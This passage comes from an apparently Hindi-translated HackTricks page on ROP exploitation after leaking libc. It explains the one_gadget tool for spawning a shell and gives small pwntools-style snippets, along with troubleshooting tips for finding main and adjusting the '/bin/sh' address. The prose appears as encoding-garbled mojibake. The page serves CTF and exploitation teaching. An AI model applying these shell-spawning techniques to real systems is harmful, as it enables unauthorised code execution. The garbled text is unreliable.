## 4(2)- ONE\_GADGET рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

рдЖрдк [**ONE\_GADGET** ](https://github.com/david942j/one\_gadget) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **system** рдФрд░ **"/bin/sh"** рдХреЗ рдмрдЬрд╛рдп рдПрдХ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред **ONE\_GADGET** libc рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдЦреЛрдЬреЗрдЧрд╛ рдЬреЛ рдХреЗрд╡рд▓ рдПрдХ **ROP рдкрддрд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╕рд╛рдорд╛рдиреНрдпрддрдГ рдХреБрдЫ рд╕реАрдорд╛рдПрдБ рд╣реЛрддреА рд╣реИрдВ, рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рдФрд░ рдЖрд╕рд╛рдиреА рд╕реЗ рдмрдЪрдиреЗ рд╡рд╛рд▓реА рд╕реАрдорд╛рдПрдБ рд╣реИрдВ рдЬреИрд╕реЗ `[rsp+0x30] == NULL`ред рдЪреВрдВрдХрд┐ рдЖрдк **RSP** рдХреЗ рдЕрдВрджрд░ рдХреЗ рдорд╛рдиреЛрдВ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдХреБрдЫ рдФрд░ NULL рдорд╛рди рднреЗрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕реАрдорд╛ рд╕реЗ рдмрдЪрд╛ рдЬрд╛ рд╕рдХреЗред

![](<../../../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## EXPLOIT FILE

рдЖрдк рдЗрд╕ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рдлрд╛рдпрджрд╛ рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЯреЗрдореНрдкрд▓реЗрдЯ рдпрд╣рд╛рдБ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## рд╕рд╛рдорд╛рдиреНрдп рд╕рдорд╕реНрдпрд╛рдПрдБ

### MAIN\_PLT = elf.symbols\['main'] рдирд╣реАрдВ рдорд┐рд▓рд╛

рдпрджрд┐ "main" рдкреНрд░рддреАрдХ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИред рддреЛ рдЖрдк рдпрд╣ рдкрддрд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдореБрдЦреНрдп рдХреЛрдб рдХрд╣рд╛рдБ рд╣реИ:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
рдФрд░ рдкрддреЗ рдХреЛ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рд╕реЗрдЯ рдХрд░реЗрдВ:
```python
MAIN_PLT = 0x401080
```
### Puts not found

рдпрджрд┐ рдмрд╛рдЗрдирд░реА Puts рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд░рд╣реА рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реА рд╣реИ

### `sh: 1: %s%s%s%s%s%s%s%s: not found`

рдпрджрд┐ рдЖрдк **рд╕рднреА** рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдмрдирд╛рдиреЗ рдХреЗ рдмрд╛рдж рдпрд╣ **рддреНрд░реБрдЯрд┐** рдкрд╛рддреЗ рд╣реИрдВ: `sh: 1: %s%s%s%s%s%s%s%s: not found`

рддреЛ **"/bin/sh" рдХреЗ рдкрддреЗ рд╕реЗ 64 рдмрд╛рдЗрдЯ рдШрдЯрд╛рдиреЗ** рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
{% hint style="success" %}
рд╕реАрдЦреЗрдВ рдФрд░ AWS рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
рд╕реАрдЦреЗрдВ рдФрд░ GCP рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рд╣рдореЗрдВ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВ.

</details>
{% endhint %}
